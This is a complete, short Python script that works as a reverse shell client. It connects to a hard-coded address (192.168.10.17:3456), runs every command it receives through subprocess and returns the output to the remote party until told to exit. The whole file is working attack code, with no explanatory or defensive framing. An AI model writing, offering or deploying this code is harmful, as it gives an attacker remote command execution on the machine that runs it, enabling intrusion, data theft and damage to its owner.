import socket
import subprocess

slave = socket.socket()
host = '192.168.10.17'
port = 3456
slave.connect((host, port))

while True:
    command = slave.recv(1024).decode()
    if command == 'exit':
        break
    output = '\n'+subprocess.getoutput(command)
    slave.send(output.encode())

slave.close()